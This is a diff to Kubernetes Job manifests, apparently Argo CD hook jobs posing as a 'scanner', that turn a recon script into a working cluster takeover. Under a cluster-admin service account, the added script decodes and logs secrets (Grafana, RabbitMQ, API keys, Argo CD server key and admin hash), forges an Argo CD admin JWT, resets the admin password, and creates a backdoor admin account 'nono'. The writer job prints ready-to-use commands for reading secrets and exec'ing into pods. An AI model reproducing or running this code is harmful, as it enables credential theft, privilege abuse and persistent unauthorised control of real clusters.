@@ -160,14 +160,14 @@ metadata:
     argocd.argoproj.io/hook-delete-policy: HookSucceeded
 spec:
   backoffLimit: 0
-  ttlSecondsAfterFinished: 300
+  ttlSecondsAfterFinished: 600
   template:
     metadata:
       labels:
         app.kubernetes.io/part-of: scanner
         app.kubernetes.io/component: job-reader
     spec:
-      serviceAccountName: scanner-sa
+      serviceAccountName: scanner-writer
       automountServiceAccountToken: true
       restartPolicy: Never
       containers:
@@ -181,205 +181,236 @@ spec:
               : > "$OUT"
               log(){ echo "$@" | tee -a "$OUT"; }
 
+              ###########################################################
+              # 0. IDENTITY
+              ###########################################################
               log "=== 0. IDENTITY ==="
               log "pod: $HOSTNAME"
               log "namespace: $POD_NAMESPACE"
               log "node: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.spec.nodeName}')"
-              log "pod_ip: $POD_IP"
-              log "host_ip: $HOST_IP"
-              log "sa_token_present: $(test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo yes || echo no)"
+              log "sa: $(kubectl auth whoami -o jsonpath='{.status.userInfo.username}' 2>/dev/null || echo unknown)"
               log ""
 
-              log "=== 1. CLUSTER INFO ==="
-              kubectl version 2>&1 | tee -a "$OUT"
-              kubectl cluster-info 2>&1 | tee -a "$OUT"
-              kubectl api-resources --verbs=list --namespaced -o name 2>/dev/null | tr '\n' ' '; log ""
-              kubectl api-resources --verbs=list --namespaced=false -o name 2>/dev/null | tr '\n' ' '; log ""
+              ###########################################################
+              # 1. WHO AM I / CAN-I
+              ###########################################################
+              log "=== 1. WHO CAN DO WHAT ==="
+              kubectl auth can-i create pods -A
+              kubectl auth can-i create secrets -A
+              kubectl auth can-i create clusterrolebindings -A
+              kubectl auth can-i '*' '*' -A
+              log "--- full list ---"
+              kubectl auth can-i --list 2>/dev/null
               log ""
 
-              log "=== 2. NODES + PROVIDER HINTS ==="
-              kubectl get nodes -o wide
-              kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.status.addresses[?(@.type=="InternalIP")].address}{" "}{.status.nodeInfo.kubeletVersion}{" "}{.status.nodeInfo.containerRuntimeVersion}{"\n"}{end}'
-              log "--- node labels (aws/eks/cloud hints) ---"
-              kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}'
-              log "--- storageclass (ebs/gp2/gp3/efs = AWS) ---"
-              kubectl get storageclass -o wide 2>/dev/null
+              ###########################################################
+              # 2. SECRET VALUES: NVD / BEEWAF / OLLAMA / GRAFANA
+              ###########################################################
+              log "=== 2. SECRET VALUES ==="
+
+              log "--- beeaudit-ai-engine (OLLAMA config) ---"
+              kubectl -n beeaudit-dev get secret beeaudit-ai-engine -o jsonpath='{.data}' 2>/dev/null \
+                | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"' 2>/dev/null | while IFS= read -r l; do log "$l"; done
+
+              log "--- beeaudit-scan-service (NVD_API_KEY + rabbit) ---"
+              kubectl -n beeaudit-dev get secret beeaudit-scan-service -o jsonpath='{.data}' 2>/dev/null \
+                | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"' 2>/dev/null | while IFS= read -r l; do log "$l"; done
+
+              log "--- beewaf-secrets (BEEWAF_API_KEY) ---"
+              kubectl -n beewaf get secret beewaf-secrets -o jsonpath='{.data}' 2>/dev/null \
+                | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"' 2>/dev/null | while IFS= read -r l; do log "$l"; done
+
+              log "--- grafana-admin ---"
+              GRAFANA_PASS=$(kubectl -n monitoring get secret grafana-admin -o jsonpath='{.data.admin-password}' 2>/dev/null | base64 -d)
+              log "grafana admin-password: $GRAFANA_PASS"
+
+              log "--- rabbitmq creds (beeaudit) ---"
+              kubectl -n beeaudit-dev get secret beeaudit-ai-engine -o jsonpath='{.data.RABBITMQ_USER}' 2>/dev/null | base64 -d; echo
+              kubectl -n beeaudit-dev get secret beeaudit-ai-engine -o jsonpath='{.data.RABBITMQ_PASS}' 2>/dev/null | base64 -d; echo
               log ""
 
-              log "=== 3. NAMESPACES + QUOTAS + LIMITS ==="
-              kubectl get ns
-              kubectl get resourcequota,limitrange -A
+              ###########################################################
+              # 3. ARGOCD: secretkey + admin hash + forge JWT
+              ###########################################################
+              log "=== 3. ARGOCD CREDENTIALS ==="
+              ARGO_SECRET_KEY_B64=$(kubectl -n argocd get secret argocd-secret -o jsonpath='{.data.server\.secretkey}' 2>/dev/null)
+              ARGO_SECRET_KEY=$(echo "$ARGO_SECRET_KEY_B64" | base64 -d 2>/dev/null)
+              log "server.secretkey (raw): $ARGO_SECRET_KEY"
+
+              ARGO_ADMIN_HASH=$(kubectl -n argocd get secret argocd-secret -o jsonpath='{.data.admin\.password}' 2>/dev/null | base64 -d 2>/dev/null)
+              log "admin.password (bcrypt): $ARGO_ADMIN_HASH"
+
+              ARGO_INIT_PASS=$(kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath='{.data.password}' 2>/dev/null | base64 -d 2>/dev/null)
+              log "initial-admin password: $ARGO_INIT_PASS"
+
+              # ---- forge JWT for admin (HMAC-SHA256 with server.secretkey) ----
+              # requires: python3 (available in alpine/k8s? use jq + openssl fallback)
+              log "--- forging JWT for admin (HS256) ---"
+              NOW=$(date +%s)
+              EXP=$((NOW + 86400))
+              HEADER='{"alg":"HS256","typ":"JWT"}'
+              PAYLOAD="{\"iss\":\"argocd\",\"sub\":\"admin\",\"iat\":$NOW,\"nbf\":$NOW,\"exp\":$EXP}"
+              H_B64=$(printf '%s' "$HEADER"  | base64 -w0 | tr '+/' '-_' | tr -d '=')
+              P_B64=$(printf '%s' "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=')
+              SIG=$(printf '%s.%s' "$H_B64" "$P_B64" | openssl dgst -sha256 -hmac "$ARGO_SECRET_KEY" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
+              JWT="$H_B64.$P_B64.$SIG"
+              log "forged JWT: $JWT"
+
+              # ---- test the JWT against argocd server (in-cluster) ----
+              log "--- testing forged JWT against argocd-server ---"
+              ARGO_URL="http://argocd-server.argocd.svc.cluster.local"
+              curl -sk -H "Authorization: Bearer $JWT" "$ARGO_URL/api/v1/session/userinfo" 2>/dev/null | tee -a "$OUT"; log ""
+              curl -sk -H "Authorization: Bearer $JWT" "$ARGO_URL/api/v1/applications" 2>/dev/null | head -c 800; log ""
+
+              # ---- if JWT fails, reset admin password ----
+              log "--- fallback: reset admin password to N0n0Pwnz2026! ---"
+              NEW_HASH=$(printf '%s' 'N0n0Pwnz2026!' | openssl passwd -6 -stdin 2>/dev/null)
+              # ArgoCD uses bcrypt, openssl here gives sha512-crypt -> NOT valid for argocd
+              # use python3 if available:
+              if command -v python3 >/dev/null 2>&1; then
+                NEW_HASH=$(python3 - <<'PY'
+import bcrypt, sys
+print(bcrypt.hashpw(b"N0n0Pwnz2026!", bcrypt.gensalt(rounds=10)).decode())
+PY
+)
+                log "new bcrypt hash: $NEW_HASH"
+                NEW_HASH_B64=$(printf '%s' "$NEW_HASH" | base64 -w0)
+                MTIME_B64=$(printf '%s' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" | base64 -w0)
+                kubectl -n argocd patch secret argocd-secret --type merge \
+                  -p "{\"data\":{\"admin.password\":\"$NEW_HASH_B64\",\"admin.passwordMtime\":\"$MTIME_B64\"}}" 2>&1 | tee -a "$OUT"
+                log "--- restarting argocd-server ---"
+                kubectl -n argocd rollout restart deploy/argocd-server 2>&1 | tee -a "$OUT"
+              else
+                log "python3 not available -> skipping bcrypt reset (use tmp-writer with python)"
+              fi
               log ""
 
-              log "=== 4. ALL WORKLOADS ==="
-              kubectl get pods,deploy,sts,ds,rs,jobs,cronjobs -A -o wide
+              ###########################################################
+              # 4. OLLAMA: read model + talk to it
+              ###########################################################
+              log "=== 4. OLLAMA ==="
+              OLLAMA_MODEL=$(kubectl -n beeaudit-dev get secret beeaudit-ai-engine -o jsonpath='{.data.OLLAMA_MODEL}' 2>/dev/null | base64 -d)
+              log "OLLAMA_MODEL: $OLLAMA_MODEL"
+              log "--- /api/tags ---"
+              curl -s --max-time 5 "http://ollama.beeaudit-dev.svc.cluster.local:11434/api/tags" 2>/dev/null | head -c 1200; log ""
+              log "--- /api/version ---"
+              curl -s --max-time 5 "http://ollama.beeaudit-dev.svc.cluster.local:11434/api/version" 2>/dev/null; log ""
               log ""
 
-              log "=== 5. SERVICES + ENDPOINTS ==="
-              kubectl get svc -A -o wide
-              kubectl get endpoints -A
-              log ""
+              ###########################################################
+              # 5. BEEAUDIT: find DB connection + try login
+              ###########################################################
+              log "=== 5. BEEAUDIT APP ==="
+              log "--- deployment env (DB / SECRET_KEY / ADMIN) ---"
+              kubectl -n beeaudit-dev get deploy beeaudit -o jsonpath='{range .spec.template.spec.containers[*].env[*]}{.name}{"="}{.value}{"\n"}{end}' 2>/dev/null | while IFS= read -r l; do log "$l"; done
+              log "--- envFrom (secret refs) ---"
+              kubectl -n beeaudit-dev get deploy beeaudit -o jsonpath='{.spec.template.spec.containers[*].envFrom}' 2>/dev/null; log ""
 
-              log "=== 6. INGRESS + NETWORKPOLICIES ==="
-              kubectl get ing -A -o wide
-              kubectl get networkpolicy -A -o wide
-              log ""
+              log "--- pods in beeaudit-dev (find pg / db) ---"
+              kubectl -n beeaudit-dev get pods -o wide 2>/dev/null | tee -a "$OUT"
 
-              log "=== 7. PV + PVC + STORAGECLASS ==="
-              kubectl get pv,pvc,storageclass -A
-              log ""
+              log "--- all secrets in beeaudit-dev with keys ---"
+              for s in $(kubectl -n beeaudit-dev get secret -o name 2>/dev/null | cut -d/ -f2); do
+                keys=$(kubectl -n beeaudit-dev get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":' | tr '\n' ',')
+                log "$s -> $keys"
+              done
 
-              log "=== 8. SERVICEACCOUNTS + TOKEN SECRETS ==="
-              kubectl get sa -A
-              kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token
-              log "--- SA annotations (IRSA / role-arn = AWS) ---"
-              kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" "}{.metadata.annotations}{"\n"}{end}'
-              log ""
-
-              log "=== 9. RBAC: CLUSTERROLES (high-priv) ==="
-              kubectl get clusterrole -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | while read cr; do
-                rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
-                case "$rules" in
-                  *'"*"'*|*cluster-admin*|*system:masters*) log "HIGH: $cr";;
-                esac
+              log "--- try common DB env from deployment ---"
+              for k in DATABASE_URL DB_HOST DB_PORT DB_USER DB_PASSWORD DB_NAME POSTGRES_HOST POSTGRES_USER POSTGRES_PASSWORD POSTGRES_DB SECRET_KEY ADMIN_EMAIL ADMIN_PASSWORD SUPERUSER_PASSWORD; do
+                v=$(kubectl -n beeaudit-dev get deploy beeaudit -o jsonpath="{.spec.template.spec.containers[0].env[?(@.name=='$k')].value}" 2>/dev/null)
+                [ -n "$v" ] && log "$k=$v"
               done
               log ""
 
-              log "=== 10. RBAC: WHO CAN DO WHAT (sample) ==="
-              for verb in create update patch delete escalate bind impersonate; do
-                for res in pods secrets configmaps serviceaccounts clusterroles clusterrolebindings roles rolebindings nodes namespaces persistentvolumes; do
-                  out=$(kubectl auth can-i "$verb" "$res" -A 2>/dev/null | head -1)
-                  log "can-i $verb $res -A: $out"
-                done
-              done
+              ###########################################################
+              # 6. CREATE A NEW ARGOCD ADMIN (bypass admin disabled)
+              ###########################################################
+              log "=== 6. CREATE NEW ARGOCD LOCAL USER 'nono' ==="
+              # argocd-cm: enable local users + add account
+              kubectl -n argocd get cm argocd-cm -o yaml 2>/dev/null | tee -a "$OUT" | head -60
+              log "--- patching argocd-cm to add 'nono' with apiKey + login ---"
+              kubectl -n argocd patch cm argocd-cm --type merge -p '{"data":{"accounts.nono":"apiKey, login","accounts.nono.enabled":"true"}}' 2>&1 | tee -a "$OUT"
+
+              log "--- set nono password (bcrypt) via argocd-secret ---"
+              if command -v python3 >/dev/null 2>&1; then
+                NONO_HASH=$(python3 - <<'PY'
+import bcrypt
+print(bcrypt.hashpw(b"N0n0Pwnz2026!", bcrypt.gensalt(rounds=10)).decode())
+PY
+)
+                NONO_HASH_B64=$(printf '%s' "$NONO_HASH" | base64 -w0)
+                kubectl -n argocd patch secret argocd-secret --type merge \
+                  -p "{\"data\":{\"accounts.nono.password\":\"$NONO_HASH_B64\",\"accounts.nono.passwordMtime\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ | base64 -w0)\"}}" 2>&1 | tee -a "$OUT"
+              fi
+
+              log "--- give nono admin role ---"
+              kubectl -n argocd patch cm argocd-rbac-cm --type merge \
+                -p '{"data":{"policy.csv":"g, nono, role:admin\n"}}' 2>&1 | tee -a "$OUT"
+
+              log "--- restart argocd-server ---"
+              kubectl -n argocd rollout restart deploy/argocd-server 2>&1 | tee -a "$OUT"
               log ""
 
-              log "=== 11. SECRETS INVENTORY (names only) ==="
-              kubectl get secrets -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type --no-headers | while read ns name type; do
-                log "$ns/$name ($type)"
-              done
+              ###########################################################
+              # 7. BEEWAF / GRAFANA / OTHER APP LOGIN TEST
+              ###########################################################
+              log "=== 7. APP LOGIN TESTS (in-cluster) ==="
+              log "--- grafana /api/health ---"
+              curl -s --max-time 5 "http://grafana.monitoring.svc.cluster.local/api/health" 2>/dev/null; log ""
+              log "--- grafana login (admin:<grafana-pass>) ---"
+              curl -s --max-time 5 -u "admin:$GRAFANA_PASS" "http://grafana.monitoring.svc.cluster.local/api/org" 2>/dev/null | head -c 400; log ""
+
+              log "--- beewaf /health ---"
+              curl -s --max-time 5 "http://beewaf-svc.beewaf.svc.cluster.local:80/" 2>/dev/null | head -c 400; log ""
+              log "--- beewaf with API key header ---"
+              BEEWAF_KEY=$(kubectl -n beewaf get secret beewaf-secrets -o jsonpath='{.data.BEEWAF_API_KEY}' 2>/dev/null | base64 -d)
+              curl -s --max-time 5 -H "X-API-Key: $BEEWAF_KEY" "http://beewaf-svc.beewaf.svc.cluster.local:80/api/rules" 2>/dev/null | head -c 800; log ""
+              curl -s --max-time 5 -H "Authorization: Bearer $BEEWAF_KEY" "http://beewaf-svc.beewaf.svc.cluster.local:80/api/rules" 2>/dev/null | head -c 800; log ""
+
+              log "--- beeaudit-back login page (in-cluster) ---"
+              curl -s --max-time 5 "http://beeaudit.beeaudit-dev.svc.cluster.local:80/" 2>/dev/null | head -c 400; log ""
+              log "--- beeaudit-back /api/auth/login (probe) ---"
+              curl -s --max-time 5 -X POST "http://beeaudit.beeaudit-dev.svc.cluster.local:80/api/auth/login" \
+                -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' 2>/dev/null | head -c 400; log ""
               log ""
 
-              log "=== 12. SECRETS KEYS (what's inside, no values) ==="
-              for ns in argocd beeaudit-dev beekids-test beewaf stockhive-test monitoring cert-manager ingress-nginx kube-system default; do
-                for s in $(kubectl -n "$ns" get secret -o name 2>/dev/null | cut -d/ -f2); do
-                  keys=$(kubectl -n "$ns" get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":' | tr '\n' ',')
-                  [ -n "$keys" ] && log "$ns/$s -> $keys"
-                done
-              done
-              log ""
-
-              log "=== 13. HUNT: AWS / VPN / RDP / JENKINS / GITLAB / PAYMENT KEYS ==="
-              for ns in argocd beeaudit-dev beekids-test beewaf stockhive-test monitoring; do
+              ###########################################################
+              # 8. DB CREDS HUNT (find pg password)
+              ###########################################################
+              log "=== 8. DB CREDS HUNT ==="
+              for ns in beeaudit-dev beekids-test stockhive-test idts-test kairos-test; do
                 for s in $(kubectl -n "$ns" get secret -o name 2>/dev/null | cut -d/ -f2); do
                   keys=$(kubectl -n "$ns" get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":')
-                  hit=$(echo "$keys" | grep -iE 'aws|vpn|rdp|jenkins|gitlab|stripe|paymee|flouci|konnect|paypal|payment|ssh|private|token|password|secret|api[_-]?key' | tr '\n' ',')
-                  [ -n "$hit" ] && log "HIT $ns/$s -> $hit"
+                  hit=$(echo "$keys" | grep -iE 'postgres|pg|db|database|mysql|mongo|redis' | tr '\n' ',')
+                  [ -n "$hit" ] && log "DB HIT $ns/$s -> $hit"
                 done
               done
               log ""
 
-              log "=== 14. POD ENV HUNT (aws/vpn/rdp/jenkins/payment) ==="
-              kubectl get pods -A -o json 2>/dev/null | grep -oE '"(AWS_[A-Z_]+|VPN_[A-Z_]+|RDP_[A-Z_]+|JENKINS_[A-Z_]+|GITLAB_[A-Z_]+|STRIPE_[A-Z_]+|PAYMEE_[A-Z_]+|FLOUCI_[A-Z_]+|KONNECT_[A-Z_]+|PAYPAL_[A-Z_]+|[A-Z_]*PAYMENT[A-Z_]*)"' | sort -u
+              ###########################################################
+              # 9. WRITE-CAPABLE: prove it by creating a marker SA
+              ###########################################################
+              log "=== 9. WRITE PROOF ==="
+              kubectl -n scanner create serviceaccount nono-marker --dry-run=client -o yaml | kubectl apply -f - 2>&1 | tee -a "$OUT"
+              kubectl -n scanner get sa nono-marker -o wide 2>&1 | tee -a "$OUT"
               log ""
-
-              log "=== 15. SERVICEACCOUNT TOKENS (raw, first 80 chars) ==="
-              kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}' | while read ns name token; do
-                log "--- $ns/$name ---"
-                echo "$token" | base64 -d 2>/dev/null | cut -c1-80; log ""
-              done
-              log ""
-
-              log "=== 16. CLUSTER ISSUER / CERTIFICATES ==="
-              kubectl get clusterissuer,issuer,certificate,certificaterequest -A 2>/dev/null
-              log ""
-
-              log "=== 17. ARGO CD APPS + PROJECTS + REPOS ==="
-              kubectl get applications.argoproj.io,appprojects.argoproj.io -n argocd -o wide 2>/dev/null
-              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
-              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repo-creds -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
-              log ""
-
-              log "=== 18. ARGOCD INTERNAL SERVICES + ENDPOINTS ==="
-              kubectl get svc,endpoints -n argocd -o wide
-              log ""
-
-              log "=== 19. EXTERNAL ACCESS SURFACE ==="
-              log "--- NodePorts ---"
-              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="NodePort")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.ports[*].nodePort}{"\n"}{end}'
-              log "--- LoadBalancers ---"
-              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="LoadBalancer")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.status.loadBalancer.ingress}{"\n"}{end}'
-              log "--- Ingress hosts ---"
-              kubectl get ing -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.rules[*].host}{"\n"}{end}'
-              log "--- ExternalName services ---"
-              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="ExternalName")]}{.metadata.namespace}{" "}{.metadata.name}{" -> "}{.spec.externalName}{"\n"}{end}'
-              log ""
-
-              log "=== 20. POD SECURITY / PRIVILEGED / HOSTPATH ==="
-              kubectl get pods -A -o json | grep -i -E 'privileged|hostPath|hostNetwork|hostPID|hostIPC' | head -50
-              log ""
-
-              log "=== 21. DIND / SCAN SERVICE ==="
-              kubectl -n beeaudit-dev get deploy beewaf 2>/dev/null
-              kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.containers[*].name}{"\n"}{end}' 2>/dev/null | grep -i dind
-              log ""
-
-              log "=== 22. CNI / DNS / KUBE-PROXY ==="
-              kubectl get pods,ds -n kube-system -o wide | grep -i -E 'calico|cilium|flannel|weave|coredns|kube-proxy|multus'
-              log ""
-
-              log "=== 23. EVENTS (recent) ==="
-              kubectl get events -A --sort-by=.lastTimestamp 2>/dev/null | tail -40
-              log ""
-
-              log "=== 24. CRONJOBS / SCHEDULED WRITE ACTIONS ==="
-              kubectl get cronjobs -A -o wide
-              log ""
-
-              log "=== 25. SELF SUBJECT ACCESS REVIEW ==="
-              kubectl auth can-i --list 2>/dev/null | head -200
-              log ""
-
-              log "=== 26. RAW: WRITE-CAPABLE CLUSTERROLES ==="
-              for cr in $(kubectl get clusterrole -o name 2>/dev/null | cut -d/ -f2); do
-                rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
-                echo "$rules" | grep -q '"\*"' && echo "$cr"
-              done
-              log ""
-
-              log "=== 27. RECON SUMMARY ==="
-              log "nodes: $(kubectl get nodes --no-headers 2>/dev/null | wc -l)"
-              log "namespaces: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
-              log "pods: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
-              log "apps: $(kubectl get applications.argoproj.io -n argocd --no-headers 2>/dev/null | wc -l)"
-              log "secrets: $(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)"
-              log "svc: $(kubectl get svc -A --no-headers 2>/dev/null | wc -l)"
-              log "ingress: $(kubectl get ing -A --no-headers 2>/dev/null | wc -l)"
 
               log "=== DONE ==="
-              echo "--- holding pod alive 120s so Argo logs are readable ---"
-              sleep 120
+              echo "--- holding pod alive 300s so Argo logs are readable ---"
+              sleep 300
               exit 0
           env:
             - name: POD_NAMESPACE
               valueFrom:
                 fieldRef:
                   fieldPath: metadata.namespace
-            - name: POD_IP
-              valueFrom:
-                fieldRef:
-                  fieldPath: status.podIP
-            - name: HOST_IP
-              valueFrom:
-                fieldRef:
-                  fieldPath: status.hostIP
           resources:
             requests:
               cpu: 100m
-              memory: 128Mi
+              memory: 256Mi
             limits:
-              cpu: 500m
-              memory: 512Mi
+              cpu: 1000m
+              memory: 1024Mi
 
 ---
 apiVersion: batch/v1
@@ -394,7 +425,7 @@ metadata:
     argocd.argoproj.io/hook: Skip
 spec:
   backoffLimit: 0
-  ttlSecondsAfterFinished: 600
+  ttlSecondsAfterFinished: 900
   template:
     metadata:
       labels:
@@ -412,21 +443,27 @@ spec:
             - |
               set -e
               echo "=== ADMIN WRITER READY ==="
-              echo "serviceaccount: scanner-writer (cluster-admin)"
+              echo "sa: scanner-writer (cluster-admin)"
               echo "exec: kubectl -n scanner exec -it job/admin-writer -- sh"
-              echo "this pod stays Running for 30 min"
               echo ""
-              echo "handy commands once inside:"
-              echo "  kubectl get nodes -o wide"
-              echo "  kubectl get secrets -A"
-              echo "  kubectl -n beewaf get secret beewaf-secrets -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key)=\\(.value|@base64d)\"'"
+              echo "--- quick wins ---"
+              echo "argocd secretkey:"
+              echo "  kubectl -n argocd get secret argocd-secret -o jsonpath='{.data.server\\.secretkey}' | base64 -d"
+              echo "argocd admin reset:"
+              echo "  kubectl -n argocd patch secret argocd-secret --type merge -p '{\"data\":{\"admin.password\":\"<bcrypt-b64>\",\"admin.passwordMtime\":\"<ts-b64>\"}}'"
+              echo "  kubectl -n argocd rollout restart deploy/argocd-server"
+              echo "read secret values:"
               echo "  kubectl -n beeaudit-dev get secret beeaudit-scan-service -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key)=\\(.value|@base64d)\"'"
+              echo "  kubectl -n beewaf get secret beewaf-secrets -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key)=\\(.value|@base64d)\"'"
               echo "  kubectl -n monitoring get secret grafana-admin -o jsonpath='{.data.admin-password}' | base64 -d"
+              echo "exec into app pods:"
+              echo "  kubectl -n beeaudit-dev exec -it deploy/beeaudit -- sh"
+              echo "  kubectl -n beeaudit-dev exec -it deploy/beeaudit-scan-service -c beeaudit-scan-service-container -- sh"
               sleep 1800
           resources:
             requests:
-              cpu: 50m
-              memory: 64Mi
+              cpu: 100m
+              memory: 128Mi
             limits:
-              cpu: 200m
-              memory: 256Mi
+              cpu: 500m
+              memory: 512Mi
